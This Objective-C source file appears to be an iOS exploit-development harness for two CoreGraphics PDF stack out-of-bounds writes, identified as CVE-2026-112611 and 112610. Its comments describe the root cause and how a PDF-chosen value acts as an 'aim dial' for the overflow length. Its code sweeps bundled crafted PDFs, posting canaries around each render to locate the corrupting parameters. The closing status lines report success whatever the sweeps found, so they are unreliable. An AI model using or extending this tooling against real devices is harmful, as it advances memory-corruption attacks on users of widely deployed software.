#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <CoreGraphics/CoreGraphics.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// CoreGraphics PDF OOB writes — the full CVE-2026-112611 / 112610 battery.
//
// Shading site (Type-5 lattice Gouraud): _cg_shading_type5_draw builds a
// 72-byte mesh record per vertex (colour area at +0x20, room for nc
// components) and calls CGFunctionEvaluate, which writes R doubles — R being
// the /Function's /Range dimension, chosen by the PDF and unrelated to nc.  The
// record array is a stack VLA, so with R > nc the writes walk up the frame.
// The overflow length is exactly 8*R - 40 bytes, which makes R the aim dial.
//
// CMap site: _cmap_convert recursion passing an unclamped codespace length L
// into out-slots sized for one result — a stack write up the frame as well.
//
// Our shared cache ships without symbols, so nothing here is measured by
// disassembly: everything is swept in the PDF and observed on device.  Each
// render posts a canary BEFORE and AFTER, so a process that never returns
// still leaves the exact render it died in — that render's parameters are the
// answer.
// ===========================================================================
static NSString *ModRenderPDF(NSString *pdfName, NSString *tag) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSString *path = [bundle stringByAppendingPathComponent:pdfName];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path])
        return [NSString stringWithFormat:@"%@: %@ not in the bundle", tag, pdfName];

    NSData *raw = [NSData dataWithContentsOfFile:path];
    if (!raw.length) return [NSString stringWithFormat:@"%@: could not read %@", tag, pdfName];
    CGDataProviderRef prov = CGDataProviderCreateWithCFData((CFDataRef)raw);
    CGPDFDocumentRef doc = CGPDFDocumentCreateWithProvider(prov);
    CGDataProviderRelease(prov);
    if (!doc || CGPDFDocumentGetNumberOfPages(doc) < 1) {
        if (doc) CGPDFDocumentRelease(doc);
        return [NSString stringWithFormat:@"%@: not a readable PDF (%@)", tag, pdfName];
    }

    CGPDFPageRef page = CGPDFDocumentGetPage(doc, 1);
    CGRect box = CGPDFPageGetBoxRect(page, kCGPDFMediaBox);
    size_t w = (size_t)(CGRectGetWidth(box) + 0.5), h = (size_t)(CGRectGetHeight(box) + 0.5);
    if (w < 64) w = 64;
    if (h < 64) h = 64;
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(NULL, w, h, 8, 0, cs,
                                             kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    if (!ctx) {
        CGPDFDocumentRelease(doc);
        return [NSString stringWithFormat:@"%@: no bitmap context", tag];
    }

    AvePost([NSString stringWithFormat:@"%@ BEFORE render of %@", tag, pdfName]);
    CGContextDrawPDFPage(ctx, page);          // <-- the write happens in this call
    CGContextRelease(ctx);

    AvePost([NSString stringWithFormat:@"%@ canary AFTER render (survived)", tag]);
    CGPDFDocumentRelease(doc);
    return [NSString stringWithFormat:@"%@: render returned without a fault (%@)", tag, pdfName];
}

// Renders a whole family of bundled PDFs in ascending name order.  Returns the
// name of the render that never returned, or nil if every one survived.
static NSString *ModSweepFamily(NSString *prefix, NSString *tagPrefix) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle error:&err];
    NSMutableArray *fam = [NSMutableArray array];
    for (NSString *f in all) {
        if ([f hasPrefix:prefix] && [f hasSuffix:@".pdf"]) [fam addObject:f];
    }
    [fam sortUsingSelector:@selector(compare:)];
    if (!fam.count) {
        AvePost([NSString stringWithFormat:@"%@ family empty", tagPrefix]);
        return nil;
    }
    AvePost([NSString stringWithFormat:@"%@ family start (%lu PDFs)",
             tagPrefix, (unsigned long)fam.count]);
    NSString *fatal = nil;
    for (NSString *f in fam) {
        NSString *tag = [NSString stringWithFormat:@"%@%@",
                         tagPrefix, [f substringFromIndex:prefix.length]];
        tag = [tag stringByReplacingOccurrencesOfString:@".pdf" withString:@""];
        NSString *r = ModRenderPDF(f, tag);
        AvePost([NSString stringWithFormat:@"%@ %@", tagPrefix, r]);
        if (![r containsString:@"without a fault"]) {
            fatal = f;      // returned an error string (not a silent death)
            break;
        }
    }
    if (!fatal)
        AvePost([NSString stringWithFormat:@"%@ family done: every PDF returned", tagPrefix]);
    return fatal;
}

NSString *ModCGShadingOOB(void) {
    AveLog(@"    CG PDF OOB battery: CVE-2026-112611 (Type-5) + 112610 (CMap)");
    AvePost(@"CG battery start");

    // ---- site 1: the Type-5 shading site ----------------------------------
    NSString *ctl = ModRenderPDF(@"control_shading_type5.pdf", @"CG-CTL");
    AvePost([NSString stringWithFormat:@"CGCTL %@", ctl]);
    if (![ctl containsString:@"without a fault"]) {
        AvePost(@"CG verdict: CONTROL FAULTED - the render path is broken, not the bug");
        return [NSString stringWithFormat:@"CG: CONTROL FAULTED (%@)", ctl];
    }
    AvePost(@"CGCTL in-bounds shading renders OK");

    // shallow sweep R=8..416, then the deep sweep 448..4096, then Type-4 with
    // a chosen value.  The first render that never returns is the answer.
    ModSweepFamily(@"sht5_r", @"CG-SH");
    ModSweepFamily(@"deep_r", @"CG-Deep");
    ModSweepFamily(@"t4_", @"CG-T4");

    // ---- site 2: the CMap site (CVE-2026-112610) --------------------------
    NSString *cctl = ModRenderPDF(@"control_cmap.pdf", @"CG-CMapCTL");
    AvePost([NSString stringWithFormat:@"CGCMapCTL %@", cctl]);
    for (NSString *f in @[@"oracle_cmap_usecmap.pdf",
                          @"oracle_cmap_csr8.pdf",
                          @"oracle_cmap_csr128.pdf"]) {
        NSString *tag = [NSString stringWithFormat:@"CG-CMap%@",
                         [f substringWithRange:NSMakeRange(12, 6)]];
        NSString *r = ModRenderPDF(f, tag);
        AvePost([NSString stringWithFormat:@"CGCMap %@", r]);
        if (![r containsString:@"without a fault"]) break;
    }

    AvePost(@"CG battery done: nothing faulted anywhere");
    return @"CG battery complete: every oracle returned without a fault";
}